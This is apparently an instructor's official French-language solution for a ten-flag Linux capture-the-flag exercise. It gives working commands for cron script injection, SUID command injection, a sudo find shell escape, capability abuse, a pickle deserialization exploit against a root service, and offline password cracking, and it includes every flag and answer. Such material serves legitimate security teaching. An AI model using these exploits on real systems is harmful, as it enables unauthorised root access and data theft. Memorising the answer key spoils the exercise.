# Operation SILENT LEDGER — Writeup complet (10/10 flags)

> Document auteur — ne pas distribuer aux joueurs. Sert de correction officielle
> et de support si un joueur conteste un flag ou reste bloqué en soutenance.

## Vue d'ensemble de la chaîne d'attaque

```
j.martin (SSH, mdp fourni)
   │  F1 lecture fichier home
   │  F2 énumération /var/backups
   │  F3 .bash_history -> mdp svc_backup
   ▼
su svc_backup
   │  F4 cron root inscriptible -> mdp r.dubois
   ▼
su r.dubois  (groupe "analysts")
   │  F5 SUID logviewer -> shell root partiel / lecture fichier
   │  F6 sudo NOPASSWD find -> shell app_agent
   ▼
sudo -u app_agent find . -exec /bin/sh \;
   │  F7 binaire cap_dac_read_search -> lecture arbitraire (token + flag7)
   │  F8 socket orchestrator + token -> pickle RCE en root -> exfiltration vault.zip
   ▼
(exécution de commandes en tant que root via l'orchestrateur)
   │  F9 crack vault.zip (zip2john + john/hashcat, rockyou.txt) -> flag9
   │  F10 crack pin.hash (hashcat mask 6 digits) -> déchiffrement final.gpg -> flag10
   ▼
FIN
```

Chaque étape est indépendante à valider dans CTFd — pas besoin d'attendre la fin
de la chaîne pour scorer les premières.

---

## Flag 1 — Premiers pas (50 pts)

Connexion initiale :
```bash
ssh j.martin@<host> -p <port>
# password: Welcome2024!
```
Puis :
```bash
ls -la ~
cat ~/welcome_note.txt
```
```
flag: MERIDIAN{f1rst_st3ps_1nt0_th3_n3tw0rk_3a1c9d}
```

## Flag 2 — Fouille de printemps (75 pts)

`/var/backups` contient plusieurs fichiers `.bak`. Deux sont des leurres (dump SQL
obsolète, ancien site web), un contient le flag :
```bash
grep -r "flag" /var/backups/ 2>/dev/null
# ou : ls -la /var/backups && cat /var/backups/app_config.bak
```
```
flag: MERIDIAN{h1dd3n_1n_pla1n_s1ght_7b2e41}
```
Le fichier `app_config.bak` mentionne aussi l'existence des comptes internes
`svc_backup`, `r.dubois`, `app_agent` — nudge naturel vers la suite.

## Flag 3 — Mauvaise mémoire (100 pts)

L'historique shell de j.martin contient une erreur de manipulation classique :
```bash
cat ~/.bash_history
```
```
su svc_backup
B4ckupSvc_2023!
```
Le mot de passe a été tapé en pensant être au prompt `su`, et s'est retrouvé dans
l'historique en clair. On l'utilise :
```bash
su svc_backup
# password: B4ckupSvc_2023!
cat ~/flag3.txt
```
```
flag: MERIDIAN{h1st0ry_r3p3ats_1ts3lf_c48a02}
```

## Flag 4 — Tâche planifiée (125 pts)

En tant que `svc_backup`, on regarde ce qui tourne en tâche planifiée :
```bash
cat /etc/cron.d/meridian
# * * * * * root /opt/scripts/cleanup.sh
ls -la /opt/scripts/cleanup.sh
```
Le script est `root:svc_backup`, mode `rwxrwxr-x` — **inscriptible par le groupe
svc_backup**, exécuté par `root` toutes les minutes. On injecte une commande :
```bash
cat >> /opt/scripts/cleanup.sh << 'EOF'
cp /root/creds/r_dubois_password.txt /tmp/loot_r_dubois.txt
chmod 644 /tmp/loot_r_dubois.txt
EOF
```
On attend au plus 60 secondes que le cron root s'exécute, puis :
```bash
cat /tmp/loot_r_dubois.txt
```
```
user: r.dubois
password: An4lyst#Secure99

flag: MERIDIAN{cr0n_j0bs_ar3_g0ld_9d17f3}
```

## Flag 5 — Journaux confidentiels (150 pts)

On récupère un shell `r.dubois` (`su r.dubois`, mot de passe ci-dessus — ce compte
est membre du groupe `analysts`). Recherche classique des binaires SUID :
```bash
find / -perm -4000 -type f 2>/dev/null
```
`/usr/local/bin/logviewer` ressort, appartenant à `root:analysts`, mode `4750`
(setuid root, exécutable uniquement par le groupe analysts — donc accessible
seulement maintenant qu'on est r.dubois). Analyse rapide :
```bash
strings /usr/local/bin/logviewer | grep -i cat
# révèle : cat /var/log/meridian/%s.log
```
Le programme construit une commande shell avec l'argument fourni, sans le
nettoyer, puis fait `setuid(0)` avant de l'exécuter via `system()`. Injection
classique, avec un `#` pour "manger" le `.log` final ajouté par le programme :
```bash
/usr/local/bin/logviewer "app; cat /root/flag5.txt #"
```
```
flag: MERIDIAN{su1d_b1nar13s_l13_0ft3n_2f6b58}
```
(Variante possible : `logviewer "app; /bin/sh #"` pour obtenir directement un
shell root complet.)

## Flag 6 — Délégation hasardeuse (175 pts)

Toujours en `r.dubois` :
```bash
sudo -l
```
```
User r.dubois may run the following commands on this host:
    (app_agent) NOPASSWD: /usr/bin/find
```
`find` est une entrée bien connue de GTFOBins pour l'escalade sudo :
```bash
sudo -u app_agent find . -exec /bin/sh \;
```
Shell obtenu en tant que `app_agent` :
```bash
whoami   # app_agent
cat ~/flag6.txt
```
```
flag: MERIDIAN{sud0_m1sc0nf1g_str1k3s_ag41n_e0a934}
```

## Flag 7 — Pouvoirs spéciaux (200 pts)

En `app_agent`, on cherche des capabilities Linux au lieu de chercher encore du
SUID :
```bash
getcap -r / 2>/dev/null
```
```
/usr/local/bin/py-agent cap_dac_read_search=ep
```
`cap_dac_read_search` permet de contourner **toutes** les vérifications de
lecture/traversée de répertoire (y compris `/root`, normalement fermé même à la
recherche). On l'utilise directement (le binaire est une copie de python3) :
```bash
/usr/local/bin/py-agent -c 'print(open("/root/flag7.txt").read())'
```
```
flag: MERIDIAN{cap4bilit13s_ar3_p0w3r_5c2d71}
```
Le même mécanisme permet de récupérer le token nécessaire pour la suite :
```bash
/usr/local/bin/py-agent -c 'print(open("/root/.orchestrator_token").read())'
/usr/local/bin/py-agent -c 'print(open("/root/README_orchestrator.txt").read())'
```
→ token : `8f3ac1e9b7d24f0aa6c9e21d4b7f9931`, et indication qu'un service
`meridian-orchestrator` écoute sur `/run/meridian/orchestrator.sock`.

## Flag 8 — L'orchestrateur (225 pts)

Le service tourne en root et écoute en JSON ligne-par-ligne sur un socket UNIX.
Commande `ping` pour confirmer :
```bash
echo '{"cmd":"ping"}' | /usr/local/bin/py-agent -c '
import socket,sys
s=socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/meridian/orchestrator.sock")
s.sendall(sys.stdin.buffer.read())
print(s.recv(4096))'
```
La commande `restore_config` prend un payload base64 qui est passé tel quel à
`pickle.loads()` — **désérialisation non sécurisée**, RCE immédiate côté serveur
(root). Exploit :
```bash
mkdir -p /tmp/loot
/usr/local/bin/py-agent << 'PYEOF'
import pickle, base64, socket, json, os

class Exploit:
    def __reduce__(self):
        cmd = ("cp /root/vault/vault.zip /root/vault/flag8.txt "
               "/root/.encrypted/final.gpg /root/.encrypted/pin.hash /tmp/loot/ ; "
               "chmod -R 777 /tmp/loot")
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
msg = {"cmd": "restore_config",
       "token": "8f3ac1e9b7d24f0aa6c9e21d4b7f9931",
       "payload": payload}

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/meridian/orchestrator.sock")
s.sendall((json.dumps(msg) + "\n").encode())
print(s.recv(4096))
PYEOF
```
```bash
cat /tmp/loot/flag8.txt
```
```
flag: MERIDIAN{0rch3str4t0r_pwn3d_88af0d}
```
On a maintenant, dans `/tmp/loot/` : `vault.zip`, `final.gpg`, `pin.hash`. On les
rapatrie sur sa machine d'attaque :
```bash
scp -P <port> app_agent@<host>:/tmp/loot/{vault.zip,final.gpg,pin.hash} .
```

## Flag 9 — Le coffre (250 pts)

`vault.zip` est protégé par mot de passe. Cassage hors-ligne classique :
```bash
zip2john vault.zip > vault.hash
john --wordlist=/usr/share/wordlists/rockyou.txt vault.hash
john --show vault.hash
# password: iloveyou
unzip -P iloveyou vault.zip
cat flag9.txt
```
```
flag: MERIDIAN{cr4ck3d_th3_v4ult_1e39b6}
```
(`decoy_customers.csv` inclus dans l'archive est un leurre narratif — données
factices, pas de flag dedans.)

## Flag 10 — Silent Ledger (300 pts, finale)

Il reste `final.gpg` (chiffrement symétrique) et `pin.hash` (empreinte SHA-256
d'un PIN à 6 chiffres). Attaque par masque, quasi instantanée :
```bash
hashcat -m 1400 -a 3 pin.hash ?d?d?d?d?d?d
hashcat -m 1400 pin.hash --show
# 482913:482913
```
Déchiffrement final :
```bash
gpg --batch --yes --pinentry-mode loopback --passphrase 482913 -o flag10.txt -d final.gpg
cat flag10.txt
```
```
MERIDIAN{0p3ration_s1l3nt_l3dg3r_c0mpl3t3_f4a217}
```

**Fin de l'engagement.** 1650 points cumulés si toutes les étapes sont validées.

---

## Compétences couvertes (pour la soutenance / grille d'évaluation)

| Flag | Compétence red team / post-exploitation                              |
|------|------------------------------------------------------------------------|
| 1-2  | Reconnaissance locale, énumération de fichiers                        |
| 3    | Récolte d'identifiants (artefacts utilisateur)                        |
| 4    | Abus de tâches planifiées, permissions Unix                           |
| 5    | Reverse engineering léger, injection de commande dans un SUID          |
| 6    | Mauvaise configuration sudo / GTFOBins                                 |
| 7    | Linux capabilities (au-delà du modèle root/non-root classique)         |
| 8    | Exploitation applicative (désérialisation non sécurisée), dev interne  |
| 9    | Cassage de mot de passe hors-ligne, pipeline zip2john/john             |
| 10   | Attaque par masque hashcat, usage GPG, synthèse de la chaîne complète  |

Cette diversité (system hardening, permissions Unix, capabilities, appsec sur un
outil interne, cryptographie appliquée) justifie la répartition des points et le
niveau attendu en 4ème année de master cybersécurité.
